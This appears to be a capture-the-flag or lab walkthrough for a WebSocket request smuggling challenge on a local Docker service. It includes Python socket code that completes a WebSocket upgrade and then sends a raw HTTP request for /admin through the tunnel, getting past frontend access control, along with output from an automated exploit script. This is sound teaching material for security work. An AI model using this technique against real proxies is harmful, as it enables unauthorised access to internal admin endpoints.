# Walkthrough: WebSocket Request Smuggling

## Setup

```bash
docker compose up --build -d
```

Confirm the service:

```bash
curl http://localhost:8080/
```

Output:
```json
{
  "service": "WebSocket Chat Proxy v1.0",
  "websocket_endpoint": "ws://localhost:8080/chat",
  "note": "Connect via WebSocket to use the chat service"
}
```

## Step 1: Confirm Frontend Access Control

The frontend blocks direct access to `/admin`:

```bash
curl -v http://localhost:8080/admin
```

Output:
```
< HTTP/1.1 403 Forbidden
{"error":"forbidden","note":"admin is not accessible from the public interface"}
```

The backend presumably exposes `/admin` without auth since it assumes it is only reachable internally.

## Step 2: Establish WebSocket Connection

Open a raw TCP socket and perform the HTTP upgrade handshake:

```python
import socket

sock = socket.socket()
sock.connect(("localhost", 8080))
sock.settimeout(5)

upgrade = (
    "GET /chat HTTP/1.1\r\n"
    "Host: localhost:8080\r\n"
    "Upgrade: websocket\r\n"
    "Connection: Upgrade\r\n"
    "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
    "Sec-WebSocket-Version: 13\r\n"
    "\r\n"
)
sock.sendall(upgrade.encode())

resp = b""
while b"\r\n\r\n" not in resp:
    resp += sock.recv(4096)

print(resp.split(b"\r\n")[0].decode())
```

Output:
```
HTTP/1.1 101 Switching Protocols
```

The proxy opened a connection to the backend and started piping bytes.

## Step 3: Smuggle the HTTP Request

Send a raw HTTP request without WebSocket framing:

```python
smuggled = (
    "GET /admin HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "Connection: close\r\n"
    "\r\n"
)
sock.sendall(smuggled.encode())

flag_response = b""
sock.settimeout(3)
try:
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        flag_response += chunk
except socket.timeout:
    pass

print(flag_response.decode())
```

Output:
```
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 60

{"status":"admin","flag":"POC{...}"}
```

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8080
```

Output:
```
[*] Target: http://localhost:8080

[*] Step 1: confirming /admin is blocked on the frontend...
    HTTP/1.1 403 Forbidden
    [+] Access blocked as expected

[*] Step 2: establishing WebSocket connection to frontend proxy...
    Response: HTTP/1.1 101 Switching Protocols
    [+] WebSocket upgrade successful -- tunnel is open

[*] Step 3: smuggling raw HTTP request through the WebSocket tunnel...
    Sending (not WebSocket framed): GET /admin HTTP/1.1

[*] Backend response:
    HTTP/1.1 200 OK
    Content-Type: application/json
    Content-Length: 60

    {"status":"admin","flag":"POC{...}"}

[+] Flag: POC{...}
```
